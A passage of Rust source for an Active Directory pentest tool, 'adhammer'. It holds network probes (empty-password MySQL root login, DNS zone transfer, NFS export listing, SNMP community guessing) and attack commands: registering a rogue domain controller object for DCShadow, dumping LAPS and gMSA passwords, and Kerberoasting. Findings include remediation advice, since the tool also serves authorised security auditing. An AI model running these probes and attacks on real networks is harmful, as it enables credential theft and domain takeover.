        body.len() as u8,
        (body.len() >> 8) as u8,
        (body.len() >> 16) as u8,
        1,
    ];
    resp.extend_from_slice(&body);
    s.write_all(&resp).await.ok()?;

    // --- read the auth result ---
    let mut rh = [0u8; 4];
    if s.read_exact(&mut rh).await.is_err() {
        return Some(format!(
            "MySQL {version}: handshake parsed (login result unavailable)"
        ));
    }
    let rlen = (rh[0] as usize) | (rh[1] as usize) << 8 | (rh[2] as usize) << 16;
    let mut rp = vec![0u8; rlen.min(1024)];
    let _ = s.read_exact(&mut rp).await;
    match rp.first() {
        Some(0x00) => Some(format!("MySQL {version}: EMPTY root PASSWORD ACCEPTED")),
        Some(0x01) if rp.get(1) == Some(&0x03) => Some(format!(
            "MySQL {version}: EMPTY root PASSWORD ACCEPTED (caching_sha2 fast-auth)"
        )),
        _ => Some(format!(
            "MySQL {version}: auth required (root/empty rejected)"
        )),
    }
}

/// MSSQL (1433): TDS PRELOGIN handshake — reports the SQL Server version and whether transport
/// encryption is enforced (ENCRYPT_OFF/NOT_SUP = credentials cross the wire in cleartext).
async fn mssql_prelogin(host: &str) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut s = connect(host, 1433).await?;
    // PRELOGIN options: VERSION(0x00,6) ENCRYPTION(0x01,1) TERMINATOR(0xff), then the data.
    let mut opts = Vec::new();
    let data_start = 3 * 2 + 1; // two 5-byte option entries + 1 terminator
    opts.extend_from_slice(&[0x00, 0x00, data_start as u8, 0x00, 0x06]); // VERSION @ +0, len 6
    opts.extend_from_slice(&[0x01, 0x00, (data_start + 6) as u8, 0x00, 0x01]); // ENCRYPTION, len 1
    opts.push(0xff); // terminator
    opts.extend_from_slice(&[0u8; 6]); // VERSION data
    opts.push(0x00); // ENCRYPT_OFF
    let total = 8 + opts.len();
    let mut pkt = vec![0x12, 0x01, (total >> 8) as u8, total as u8, 0, 0, 0, 0]; // TDS header (type PRELOGIN, EOM)
    pkt.extend_from_slice(&opts);
    s.write_all(&pkt).await.ok()?;

    let mut hdr = [0u8; 8];
    tokio::time::timeout(
        std::time::Duration::from_millis(1000),
        s.read_exact(&mut hdr),
    )
    .await
    .ok()?
    .ok()?;
    if hdr[0] != 0x04 {
        return Some("MSSQL: reachable (unexpected TDS response)".to_string());
    }
    let len = ((hdr[2] as usize) << 8 | hdr[3] as usize).saturating_sub(8);
    let mut body = vec![0u8; len.min(512)];
    if s.read_exact(&mut body).await.is_err() || body.len() < 5 {
        return Some("MSSQL: TDS PRELOGIN responded".to_string());
    }
    let (version, enc) = parse_prelogin(&body);
    let v = version.unwrap_or_else(|| "unknown".into());
    let e = match enc {
        Some(0x00) => "encryption OFF (login in cleartext)",
        Some(0x02) => "encryption NOT SUPPORTED (login in cleartext)",
        Some(0x01) => "encryption available",
        Some(0x03) => "encryption REQUIRED",
        _ => "encryption state unknown",
    };
    Some(format!("MSSQL {v}: {e}"))
}

/// Walk a TDS PRELOGIN option table for VERSION(0x00) → "maj.min.build" and ENCRYPTION(0x01).
fn parse_prelogin(body: &[u8]) -> (Option<String>, Option<u8>) {
    let (mut version, mut enc) = (None, None);
    let mut i = 0;
    while i + 5 <= body.len() && body[i] != 0xff {
        let token = body[i];
        let off = (body[i + 1] as usize) << 8 | body[i + 2] as usize;
        let l = (body[i + 3] as usize) << 8 | body[i + 4] as usize;
        if off + l <= body.len() {
            let d = &body[off..off + l];
            if token == 0x00 && l >= 4 {
                version = Some(format!(
                    "{}.{}.{}",
                    d[0],
                    d[1],
                    (d[2] as u16) << 8 | d[3] as u16
                ));
            } else if token == 0x01 && l >= 1 {
                enc = Some(d[0]);
            }
        }
        i += 5;
    }
    (version, enc)
}

/// DNS (53): fingerprint via `version.bind` (CHAOS TXT) and, if a zone is supplied, attempt an
/// AXFR zone transfer over TCP and report how many records the server leaked.
async fn dns_check(host: &str, zone: Option<&str>) -> Option<String> {
    let mut out = Vec::new();
    if let Some(v) = dns_version_bind(host).await {
        out.push(format!("version.bind={v}"));
    }
    if let Some(z) = zone {
        match dns_axfr(host, z).await {
            Some(count) if count > 0 => {
                out.push(format!("AXFR OK for {z}: {count} records LEAKED"))
            }
            Some(_) => out.push(format!("AXFR refused for {z}")),
            None => {}
        }
    }
    (!out.is_empty()).then(|| format!("DNS: {}", out.join(" · ")))
}

/// CHAOS-class TXT query for `version.bind` over UDP — reveals the resolver software/version.
async fn dns_version_bind(host: &str) -> Option<String> {
    let sock = tokio::net::UdpSocket::bind("0.0.0.0:0").await.ok()?;
    sock.connect((host, 53)).await.ok()?;
    // Header: id, flags(RD), qd=1; Question: version.bind TXT CH.
    let mut q = vec![0x13, 0x37, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0];
    for label in ["version", "bind"] {
        q.push(label.len() as u8);
        q.extend_from_slice(label.as_bytes());
    }
    q.push(0);
    q.extend_from_slice(&[0x00, 0x10, 0x00, 0x03]); // TXT, CHAOS
    sock.send(&q).await.ok()?;
    let mut buf = [0u8; 512];
    let n = tokio::time::timeout(std::time::Duration::from_millis(900), sock.recv(&mut buf))
        .await
        .ok()?
        .ok()?;
    // Grab the longest printable run in the answer section as the version string.
    let ans = &buf[..n];
    let mut best = String::new();
    let mut cur = String::new();
    for &b in &ans[12.min(n)..] {
        if (0x20..0x7f).contains(&b) {
            cur.push(b as char);
        } else {
            if cur.trim().len() > best.trim().len() {
                best = cur.clone();
            }
            cur.clear();
        }
    }
    if cur.trim().len() > best.trim().len() {
        best = cur;
    }
    let best = best.trim().to_string();
    (best.len() >= 3).then_some(best)
}

/// Attempt a full AXFR zone transfer over TCP/53. Returns the number of resource records
/// returned (0 = server refused / not authoritative), or None if the query failed.
async fn dns_axfr(host: &str, zone: &str) -> Option<usize> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut s = connect(host, 53).await?;
    let mut msg = vec![0x13, 0x38, 0x00, 0x00, 0, 1, 0, 0, 0, 0, 0, 0]; // no RD; AXFR is authoritative
    for label in zone.split('.').filter(|l| !l.is_empty()) {
        msg.push(label.len() as u8);
        msg.extend_from_slice(label.as_bytes());
    }
    msg.push(0);
    msg.extend_from_slice(&[0x00, 0xfc, 0x00, 0x01]); // QTYPE=AXFR(252), QCLASS=IN
    let framed = [&(msg.len() as u16).to_be_bytes()[..], &msg].concat(); // TCP DNS 2-byte length prefix
    s.write_all(&framed).await.ok()?;
    // Read length-prefixed response messages until the connection closes or a short read.
    let mut total_ancount = 0usize;
    let mut got_any = false;
    loop {
        let mut len = [0u8; 2];
        match tokio::time::timeout(
            std::time::Duration::from_millis(1500),
            s.read_exact(&mut len),
        )
        .await
        {
            Ok(Ok(_)) => {}
            _ => break,
        }
        let n = u16::from_be_bytes(len) as usize;
        if n < 12 {
            break;
        }
        let mut buf = vec![0u8; n];
        if s.read_exact(&mut buf).await.is_err() {
            break;
        }
        got_any = true;
        let rcode = buf[3] & 0x0f;
        if rcode != 0 {
            return Some(0); // REFUSED / NOTAUTH etc.
        }
        total_ancount += u16::from_be_bytes([buf[6], buf[7]]) as usize;
        // AXFR ends when the closing SOA is returned; a single message with ANCOUNT is enough
        // to conclude for our purposes, but keep reading in case it is chunked.
        if total_ancount > 1 {
            break;
        }
    }
    got_any.then_some(total_ancount)
}

/// NFS (via portmap/111): GETPORT for the MOUNT program, then MOUNTPROC_EXPORT to list the
/// exported shares — the `showmount -e` equivalent, a classic data-exposure finding.
async fn nfs_showmount(host: &str) -> Option<String> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    // --- portmap GETPORT (prog 100000 v2 proc 3) for MOUNT (100005) v3 over TCP(6) ---
    let mut s = connect(host, 111).await?;
    let mut call = rpc_call(100000, 2, 3, 0x4841_4d31);
    call.extend_from_slice(&100005u32.to_be_bytes()); // prog
    call.extend_from_slice(&3u32.to_be_bytes()); // vers
    call.extend_from_slice(&6u32.to_be_bytes()); // proto = TCP
    call.extend_from_slice(&0u32.to_be_bytes()); // port (ignored)
    s.write_all(&rpc_frame(&call)).await.ok()?;
    let reply = rpc_recv(&mut s).await?;
    let port = reply
        .get(reply.len().saturating_sub(4)..)
        .map(|b| u32::from_be_bytes(b.try_into().unwrap()))?;
    if port == 0 || port > 65535 {
        return Some("NFS: portmap up but MOUNT not registered".to_string());
    }
    // --- MOUNT EXPORT (prog 100005 v3 proc 5) on the resolved port ---
    let mut m = connect(host, port as u16).await?;
    let call = rpc_call(100005, 3, 5, 0x4841_4d32);
    m.write_all(&rpc_frame(&call)).await.ok()?;
    let mut buf = vec![0u8; 4096];
    let n = tokio::time::timeout(std::time::Duration::from_millis(1200), m.read(&mut buf))
        .await
        .ok()?
        .ok()?;
    // The export list is a chain of (opaque dirpath, group list, next?) — pull the dirpath strings.
    let exports = parse_exports(&buf[..n.min(buf.len())]);
    if exports.is_empty() {
        Some(format!(
            "NFS: MOUNT on :{port} (no exports listed / access denied)"
        ))
    } else {
        Some(format!(
            "NFS: {} export(s): {}",
            exports.len(),
            exports.join(", ")
        ))
    }
}

/// Build an ONC RPC v2 CALL header with AUTH_NULL creds/verifier for the given program.
fn rpc_call(prog: u32, vers: u32, proc_: u32, xid: u32) -> Vec<u8> {
    let mut b = Vec::new();
    b.extend_from_slice(&xid.to_be_bytes());
    b.extend_from_slice(&0u32.to_be_bytes()); // msg_type = CALL
    b.extend_from_slice(&2u32.to_be_bytes()); // rpcvers
    b.extend_from_slice(&prog.to_be_bytes());
    b.extend_from_slice(&vers.to_be_bytes());
    b.extend_from_slice(&proc_.to_be_bytes());
    b.extend_from_slice(&[0, 0, 0, 0, 0, 0, 0, 0]); // cred: AUTH_NULL, len 0
    b.extend_from_slice(&[0, 0, 0, 0, 0, 0, 0, 0]); // verf: AUTH_NULL, len 0
    b
}

/// Wrap an RPC message in a single last-fragment record marker (TCP transport).
fn rpc_frame(msg: &[u8]) -> Vec<u8> {
    let marker = 0x8000_0000u32 | (msg.len() as u32);
    [&marker.to_be_bytes()[..], msg].concat()
}

/// Read one record-marked RPC reply and return the payload after the 24-byte accepted-reply head.
async fn rpc_recv(s: &mut tokio::net::TcpStream) -> Option<Vec<u8>> {
    use tokio::io::AsyncReadExt;
    let mut m = [0u8; 4];
    tokio::time::timeout(std::time::Duration::from_millis(1200), s.read_exact(&mut m))
        .await
        .ok()?
        .ok()?;
    let len = (u32::from_be_bytes(m) & 0x7fff_ffff) as usize;
    if !(4..=65536).contains(&len) {
        return None;
    }
    let mut buf = vec![0u8; len];
    s.read_exact(&mut buf).await.ok()?;
    Some(buf)
}

/// Parse a MOUNTPROC_EXPORT reply body into export path strings (best-effort XDR walk).
fn parse_exports(body: &[u8]) -> Vec<String> {
    let mut out = Vec::new();
    let mut i = 24usize.min(body.len()); // skip RPC accepted-reply header
    while i + 4 <= body.len() {
        let more = u32::from_be_bytes(body[i..i + 4].try_into().unwrap());
        i += 4;
        if more != 1 {
            break; // 0 = end of export list
        }
        if i + 4 > body.len() {
            break;
        }
        let dlen = u32::from_be_bytes(body[i..i + 4].try_into().unwrap()) as usize;
        i += 4;
        if dlen == 0 || dlen > 1024 || i + dlen > body.len() {
            break;
        }
        out.push(String::from_utf8_lossy(&body[i..i + dlen]).to_string());
        i += (dlen + 3) & !3; // XDR 4-byte alignment
                              // Skip the group list attached to this export.
        while i + 4 <= body.len() {
            let g = u32::from_be_bytes(body[i..i + 4].try_into().unwrap());
            i += 4;
            if g != 1 {
                break;
            }
            if i + 4 > body.len() {
                break;
            }
            let glen = u32::from_be_bytes(body[i..i + 4].try_into().unwrap()) as usize;
            i += 4 + ((glen + 3) & !3);
        }
    }
    out
}

/// SNMP (UDP/161): GET sysDescr.0 with each community string; a valid reply means the community
/// is accepted (read access to the whole MIB) — reports the community and the system descriptor.
async fn snmp_public(host: &str, communities: &str) -> Option<String> {
    for community in communities
        .split(',')
        .map(str::trim)
        .filter(|c| !c.is_empty())
    {
        if let Some(desc) = snmp_get_sysdescr(host, community).await {
            let d = desc.chars().take(60).collect::<String>();
            return Some(format!("SNMP: community '{community}' VALID → {d}"));
        }
    }
    None
}

/// One SNMPv1 GetRequest for sysDescr.0 (1.3.6.1.2.1.1.1.0); returns the descriptor if accepted.
async fn snmp_get_sysdescr(host: &str, community: &str) -> Option<String> {
    let sock = tokio::net::UdpSocket::bind("0.0.0.0:0").await.ok()?;
    sock.connect((host, 161)).await.ok()?;
    let oid = [0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00]; // 1.3.6.1.2.1.1.1.0
    let varbind = ber_seq(&[ber(0x06, &oid), ber(0x05, &[])].concat()); // OID + NULL
    let varbinds = ber_seq(&varbind);
    let pdu_body = [
        ber(0x02, &[0x2a]), // request-id
        ber(0x02, &[0x00]), // error-status
        ber(0x02, &[0x00]), // error-index
        varbinds,
    ]
    .concat();
    let pdu = ber(0xa0, &pdu_body); // GetRequest
    let msg = ber_seq(
        &[
            ber(0x02, &[0x00]),              // version = 0 (v1)
            ber(0x04, community.as_bytes()), // community
            pdu,
        ]
        .concat(),
    );
    sock.send(&msg).await.ok()?;
    let mut buf = [0u8; 1500];
    let n = tokio::time::timeout(std::time::Duration::from_millis(900), sock.recv(&mut buf))
        .await
        .ok()?
        .ok()?;
    // Any well-formed SEQUENCE reply means the community was accepted; pull the sysDescr string.
    let resp = &buf[..n];
    if resp.first() != Some(&0x30) {
        return None;
    }
    Some(snmp_first_octet_string(resp).unwrap_or_else(|| "(accepted)".to_string()))
}

/// Minimal BER: definite-length TLV (lengths < 65536).
fn ber(tag: u8, val: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    let len = val.len();
    if len < 0x80 {
        out.push(len as u8);
    } else if len < 0x100 {
        out.extend_from_slice(&[0x81, len as u8]);
    } else {
        out.extend_from_slice(&[0x82, (len >> 8) as u8, len as u8]);
    }
    out.extend_from_slice(val);
    out
}
fn ber_seq(val: &[u8]) -> Vec<u8> {
    ber(0x30, val)
}

/// Walk BER and return the last printable OCTET STRING value — the sysDescr in an SNMP reply.
fn snmp_first_octet_string(buf: &[u8]) -> Option<String> {
    let mut i = 0;
    let mut best: Option<String> = None;
    while i + 2 <= buf.len() {
        let tag = buf[i];
        let mut len = buf[i + 1] as usize;
        let mut hdr = 2;
        if len == 0x81 && i + 2 < buf.len() {
            len = buf[i + 2] as usize;
            hdr = 3;
        } else if len == 0x82 && i + 3 < buf.len() {
            len = ((buf[i + 2] as usize) << 8) | buf[i + 3] as usize;
            hdr = 4;
        }
        if tag == 0x30 || tag == 0xa0 || tag == 0xa2 {
            i += hdr; // descend into constructed types
            continue;
        }
        if i + hdr + len > buf.len() {
            break;
        }
        if tag == 0x04 && len >= 4 {
            let v = &buf[i + hdr..i + hdr + len];
            if v.iter().all(|&b| (0x20..0x7f).contains(&b)) {
                best = Some(String::from_utf8_lossy(v).to_string());
            }
        }
        i += hdr + len;
    }
    best
}

/// Expand a target spec: `@file` (one host/line), `a.b.c.d/nn` CIDR, or a comma list.
fn expand_targets(spec: &str) -> Result<Vec<String>> {
    if let Some(file) = spec.strip_prefix('@') {
        let content = std::fs::read_to_string(file).context("read targets file")?;
        return Ok(content
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect());
    }
    if spec.contains('/') {
        let (base, prefix) = spec.split_once('/').unwrap();
        let ip: std::net::Ipv4Addr = base.parse().context("bad CIDR address")?;
        let prefix: u32 = prefix.parse().context("bad CIDR prefix")?;
        anyhow::ensure!((8..=32).contains(&prefix), "CIDR prefix must be 8..=32");
        let host_bits = 32 - prefix;
        let size = if host_bits == 0 {
            1u32
        } else {
            1u32 << host_bits
        };
        let mask = if host_bits == 0 {
            u32::MAX
        } else {
            !(size - 1)
        };
        let net = u32::from(ip) & mask;
        // Skip network + broadcast addresses for blocks with room for them.
        let (start, end) = if prefix <= 30 {
            (1, size - 1)
        } else {
            (0, size)
        };
        return Ok((start..end)
            .map(|i| std::net::Ipv4Addr::from(net + i).to_string())
            .collect());
    }
    Ok(spec
        .split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect())
}

async fn esc_registry_probe(
    host: &str,
    domain: &str,
    user: &str,
    password: &str,
    ca_names: &[String],
) -> Result<Vec<adhammer_core::Finding>> {
    use dcerpc::rrp::RegistryClient;
    use smb2_client::SmbClient;

    let mut smb = SmbClient::connect(host).await?;
    smb.login(host, domain, user, password).await?;
    smb.tree_connect(&format!("\\\\{host}\\IPC$")).await?;
    let mut reg = RegistryClient::connect(&mut smb, domain, user, password, host).await?;

    let mut all = Vec::new();
    for ca in ca_names {
        all.extend(esc_registry::probe_esc_registry(&mut reg, ca).await);
    }
    Ok(all)
}

fn config(a: &ScanArgs) -> LdapConfig {
    LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: a.base_dn.clone(),
        insecure: a.insecure,
        gssapi: a.gssapi,
    }
}

async fn scan(a: ScanArgs) -> Result<()> {
    let sp = ui::Spinner::start("collecting AD objects over LDAP");
    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    sp.done(&format!("{} AD object(s) collected", snap.objects.len()));
    tracing::info!(objects = snap.objects.len(), "collected");

    let graph = ControlGraph::build(&snap);
    let stats = graph.stats();
    let paths = graph.paths_to_tier0();
    let mut findings = adhammer_checks::run_all(&snap, &graph);
    {
        let crit = findings
            .iter()
            .filter(|f| matches!(f.severity, adhammer_core::finding::Severity::Critical))
            .count();
        ui::ok(&format!(
            "{} finding(s) ({crit} critical) · {} control-path(s) to Tier-0",
            findings.len(),
            paths.len()
        ));
    }

    // The cheapest routes, hop by hop, with the command that walks each hop. A hop with no
    // executor is printed as such rather than silently skipped.
    for p in paths.iter().take(5) {
        eprintln!("\n[>] {} (cost {})", p.render(), p.cost);
        for (i, s) in p.steps.iter().enumerate() {
            match &s.command {
                Some(c) => eprintln!("    {}. {:<26} {}", i + 1, s.edge, c),
                None => eprintln!("    {}. {:<26} (detection only)", i + 1, s.edge),
            }
            eprintln!("       fix: {}", s.mitigation);
        }
    }

    // Optional BloodHound export (BloodHound CE v5 ingest .zip) alongside the report.
    // Two paths: the DEPRECATED --bloodhound flag (kept working through 1.4.x for one
    // release cycle) and the new --out=<path>.zip auto-inference. --bloodhound wins if
    // both are set so scripts that already know their zip path don't silently overwrite.
    if let Some(path) = &a.bloodhound {
        eprintln!(
            "[!] `--bloodhound <path>` is DEPRECATED and will be removed in 1.5.0. Use \
             `--out <path.zip>` instead — the .zip extension routes to the BloodHound-CE bundle \
             writer automatically."
        );
        let p = std::path::Path::new(path);
        let n = adhammer_bloodhound::export_zip(&snap, p)?;
        eprintln!("[+] BloodHound export: {} JSON files → {}", n, p.display());
    } else if let Some(path) = &a.out {
        // --out routing: infer BloodHound bundle from a .zip extension. Non-.zip
        // extensions defer to the report-render path below (json / html).
        let ext = std::path::Path::new(path)
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        if ext == "zip" {
            let p = std::path::Path::new(path);
            let n = adhammer_bloodhound::export_zip(&snap, p)?;
            eprintln!("[+] BloodHound export: {} JSON files → {}", n, p.display());
        }
    }

    // ESC registry probe: ESC6/7/10/11/16 via MS-RRP over the DC's Remote Registry.
    // Runs automatically when a CA is discovered in the LDAP snapshot. Best-effort — if the
    // Remote Registry service is stopped the scan still completes with passive findings only.
    {
        let ca_names: Vec<String> = snap
            .iter_class("pKIEnrollmentService")
            .filter_map(|o| o.one("cn").or_else(|| o.one("name")).map(|s| s.to_string()))
            .collect();
        if !ca_names.is_empty() {
            let host = a
                .url
                .split("://")
                .nth(1)
                .unwrap_or(&a.url)
                .split('/')
                .next()
                .unwrap_or("")
                .split(':')
                .next()
                .unwrap_or("")
                .to_string();
            let domain = snap.domain.netbios.clone().unwrap_or_else(|| {
                snap.domain
                    .domain_dn
                    .split(',')
                    .find_map(|p| {
                        p.trim()
                            .strip_prefix("DC=")
                            .or_else(|| p.trim().strip_prefix("dc="))
                    })
                    .unwrap_or("")
                    .to_uppercase()
            });
            let user = a
                .user
                .split('@')
                .next()
                .and_then(|s| s.split('\\').next_back())
                .unwrap_or(&a.user)
                .to_string();
            let sp = ui::Spinner::start("ESC registry probe (MS-RRP)");
            match esc_registry_probe(&host, &domain, &user, &a.password, &ca_names).await {
                Ok(esc_findings) => {
                    let n = esc_findings.len();
                    findings.extend(esc_findings);
                    if n > 0 {
                        sp.done(&format!(
                            "{n} registry-based ESC finding(s) (ESC6/7/10/11/16)"
                        ));
                    } else {
                        sp.done("no registry-based ESC exposure");
                    }
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("0xc00000ac") || msg.contains("winreg") {
                        sp.done_warn(
                            "Remote Registry unavailable — ESC6/7/10/11/16 skipped (passive checks unaffected)",
                        );
                    } else {
                        sp.done_warn(&format!("ESC registry probe failed: {e:#}"));
                    }
                }
            }
        }
    }

    // ESC8 web-enrollment probe: check each CA host for HTTP NTLM relay exposure.
    {
        let ca_hosts: Vec<String> = snap
            .iter_class("pKIEnrollmentService")
            .filter_map(|o| o.one("dNSHostName").map(|s| s.to_string()))
            .filter(|h| !h.is_empty())
            .collect();
        for host in &ca_hosts {
            if let Some(_detail) = esc8_probe(host).await {
                findings.push(adhammer_core::Finding {
                    id: "A-Esc8".into(),
                    title: format!(
                        "ESC8: web enrollment at http://{host}/certsrv exposes NTLM (relayable)"
                    ),
                    category: adhammer_core::finding::Category::Anomalies,
                    severity: adhammer_core::finding::Severity::Critical,
                    mitre: vec![adhammer_core::finding::mitre::CERT_ABUSE],
                    affected: vec![host.clone()],
                    detail: format!(
                        "The CA at {host} exposes HTTP web enrollment with NTLM authentication \
                         over cleartext — a coerced machine's NTLM can be relayed for a cert, \
                         then PKINIT'd for that machine's TGT."
                    ),
                    impact: Some(
                        "Attacker coerces a DC (PetitPotam/PrinterBug), relays its NTLM to \
                         the web enrollment endpoint, obtains a machine cert, PKINITs for the \
                         DC's TGT, then DCSync. Full domain compromise from any authenticated user."
                            .into(),
                    ),
                    remediation:
                        "Disable HTTP web enrollment or require HTTPS + Extended Protection (EPA); \
                         enforce SMB/LDAP signing to blunt the relay."
                            .into(),
                    weight_bonus: 30,
                });
            }
        }
    }

    // Optional SYSVOL sweep: GPP cpasswords (MS14-025) + default-policy signing/NTLM.
    if let Some(sysvol) = &a.sysvol {
        let root = std::path::Path::new(sysvol);
        let hits = adhammer_sysvol::scan(root);
        tracing::info!(gpp = hits.len(), "sysvol GPP swept");
        if let Some(f) = adhammer_sysvol::finding(&hits) {
            findings.insert(0, f);
        }
        let policy = adhammer_sysvol::gptmpl::scan_policy(root);
        findings.extend(adhammer_sysvol::gptmpl::policy_findings(&policy));
    }

    let report = Report::build(
        &snap.domain.domain_dn,
        findings,
        paths,
        stats,
        &RiskConfig::default(),
    );

    // Resolve output format + destination.
    //
    // Order of precedence:
    //   1. --format explicit                        → wins over any inference
    //   2. --out=<path>.{json,html,zip} inference   → picks format from extension
    //   3. default --format json                    → stdout
    //
    // .zip via --out is already handled above (BloodHound-CE bundle). Here we only
    // route the JSON/HTML report body.
    let explicit_format = std::env::args().any(|a| a == "--format");
    let format = if explicit_format {
        a.format.clone()
    } else if let Some(path) = &a.out {
        match std::path::Path::new(path)
            .extension()
            .and_then(|e| e.to_str())
            .map(|e| e.to_ascii_lowercase())
            .as_deref()
        {
            Some("html") => "html".to_string(),
            Some("zip") => {
                // .zip already written; nothing to serialise here.
                return Ok(());
            }
            _ => "json".to_string(),
        }
    } else {
        a.format.clone()
    };

    let body = match format.as_str() {
        "html" => report.to_html(),
        _ => report.to_json(),
    };

    match &a.out {
        Some(path) if path != "-" => {
            std::fs::write(path, &body).with_context(|| format!("write scan report → {path}"))?;
            eprintln!(
                "[+] {} report written → {} ({} bytes)",
                format,
                path,
                body.len()
            );
        }
        _ => {
            println!("{body}");
        }
    }
    Ok(())
}

// fn badsuccessor moved to `attacks::badsuccessor` in arch-0.
// fn esc4 moved to `attacks::esc4` in arch-0.
// fn shadowcred moved to attacks::shadowcred in arch-0.

/// `attack dcshadow` — enumerate accounts that already hold DCSync replication rights
/// (Replicating Directory Changes All / In Filtered Set / Get Changes). Every principal on
/// this list can already dump secrets — and every non-Tier-0 principal on it is a straight
/// path to Domain Admin. Full DCShadow *push* (register a rogue nTDSDSA + trigger DrsReplicaAdd)
/// is not implemented — building it without a live 2016+/2019+/2022+/2025 matrix would ship
/// blind protocol code. Once the matrix is up, this command grows the push side.
async fn dcshadow(a: DcshadowArgs) -> Result<()> {
    // Prep / cleanup take precedence over the detector; they mutate the target.
    if let Some(name) = a.prep.as_deref() {
        use adhammer_collector::Collector;
        let mut coll = Collector::connect(&config(&a.scan)).await?;
        let dns = dcshadow::prep(&mut coll, name, &a.site).await?;
        println!("[+] DCShadow prep registered rogue nTDSDSA");
        println!("    Server : {}", dns.server_dn);
        println!("    NTDS   : {}", dns.ntds_dn);
        println!();
        println!(
            "    Cleanup: `attack dcshadow --cleanup {name} --site {}`",
            a.site
        );
        return Ok(());
    }
    if let Some(name) = a.cleanup.as_deref() {
        use adhammer_collector::Collector;
        let mut coll = Collector::connect(&config(&a.scan)).await?;
        dcshadow::cleanup(&mut coll, name, &a.site).await?;
        println!(
            "[+] DCShadow cleanup removed rogue nTDSDSA '{name}' under site '{}'",
            a.site
        );
        return Ok(());
    }
    use adhammer_graph::ControlPrimitive as P;
    let snap = Collector::connect(&config(&a.scan))
        .await?
        .collect()
        .await?;
    let graph = adhammer_graph::ControlGraph::build(&snap);
    let mut who = Vec::new();
    for kind in [
        P::DcsyncGetChanges,
        P::DcsyncGetChangesAll,
        P::DcsyncGetChangesFiltered,
    ] {
        for (src, dst) in graph.direct_edges_to_tier0(kind.into()) {
            who.push((src, dst, kind));
        }
    }
    if who.is_empty() {
        println!("== DCShadow-capable principals ==");
        println!("  (none found — no principal outside Tier-0 holds replication rights)");
    } else {
        println!("== DCShadow-capable principals ({}) ==", who.len());
        for (src, dst, kind) in &who {
            println!("  {src:<32} → {dst}   [{}]", kind.name());
        }
        println!();
        println!(
            "These already have DCSync. Each is a shortcut to DA — running `attack dcsync --user krbtgt`"
        );
        println!("as any of them dumps the whole domain without a lateral move.");
    }
    Ok(())
}

/// `check adcs` — pull every `pKICertificateTemplate` from the domain, run the
/// `ms-crtd` ESC1-15 rule pack over the typed view, and emit adhammer `Finding`s.
/// Offline pass — no ACL walk, no CA registry probe, no active enrollment; the
/// exhaustive ESC pipeline is `adhammer scan` (which fires the parallel
/// `A-AdcsEsc` rule alongside the graph-based paths).
async fn check_adcs(a: CheckAdcsArgs) -> Result<()> {
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let snap = Collector::connect(&cfg).await?.collect().await?;
    let templates =
        adhammer_collector::sources::adcs::templates_from(snap.objects.iter().collect::<Vec<_>>());
    let findings = adhammer_checks::rules::esc::detect_all(&templates);
    if a.json {
        let j = serde_json::to_string_pretty(&findings)?;
        println!("{j}");
    } else {
        println!(
            "== check adcs (ms-crtd ESC rule pack) — {} template(s) scanned, {} finding(s) ==",
            templates.len(),
            findings.len()
        );
        for f in &findings {
            println!(
                "[{:?}] {} — {}\n  affected: {}\n  {}\n",
                f.severity,
                f.id,
                f.title,
                f.affected.join(", "),
                f.detail
            );
        }
    }
    Ok(())
}

/// `dump laps` — read LAPS local-admin passwords. The `ms-gkdi`-first wire path
/// (parse `msLAPS-EncryptedPassword` header via `sources::gkdi::parse_key_identifier`,
/// fetch the GKDI envelope, derive the L2 key locally) is not yet plumbed end-to-end
/// through the `ISDKey` sealed RPC in adhammer's transport; today this command
/// prints a hint and defers to the mature `attack laps` code path.
async fn dump_laps(a: DumpLapsArgs) -> Result<()> {
    eprintln!(
        "[!] `dump laps` is DEPRECATED and will be removed in 1.5.0 — use `attack laps` (same \
         functionality, one command per capability). The GKDI-first offline-derive path lives in \
         `adhammer_collector::sources::gkdi` for callers who want the library primitive."
    );
    let _ = a.dc; // reserved for the ms-gkdi path
    attacks::laps::laps(attacks::laps::LapsArgs {
        target: a.target,
        url: a.url,
        user: a.user,
        password: a.password,
        insecure: a.insecure,
    })
    .await
}

/// `dump gmsa` — read a gMSA's `msDS-ManagedPassword` blob. Same status as
/// `dump laps`: the seed-key derivation lives in `sources::gkdi`, but the
/// LDAP-attribute-fetch path already handles gMSA end-to-end via
/// `attack gmsa` (`msDS-ManagedPassword` over a sealed LDAP channel).
async fn dump_gmsa(a: DumpGmsaArgs) -> Result<()> {
    eprintln!(
        "[!] `dump gmsa` is DEPRECATED and will be removed in 1.5.0 — use `attack gmsa` (same \
         functionality, one command per capability)."
    );
    attacks::gmsa::gmsa(attacks::gmsa::GmsaArgs {
        url: a.url,
        user: a.user,
        password: a.password,
        insecure: a.insecure,
        target: a.target,
    })
    .await
}
// EscVariant + IcprEsc1Args + fn icpr_esc1 moved to attacks::icpr_esc1 in arch-0.

// fn unconstrained moved to `attacks::unconstrained` in arch-0.
async fn roast(a: ScanArgs) -> Result<()> {
    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    let realm = snap
        .domain
        .domain_dn
        .split(',')
        .filter_map(|p| p.strip_prefix("DC="))
        .collect::<Vec<_>>()
        .join(".")
        .to_uppercase();
    let (kerberoast, asrep) = adhammer_kerberos::candidates(&snap, &realm);

    println!("== Kerberoastable ({}) ==", kerberoast.len());
    match &a.kdc {
        None => {
            for c in &kerberoast {
                println!("  {}  spn={}", c.sam, c.spn.as_deref().unwrap_or("-"));
            }
        }
        Some(kdc) if !kerberoast.is_empty() => {
            // One authenticated TGT, then a TGS-REQ per SPN.
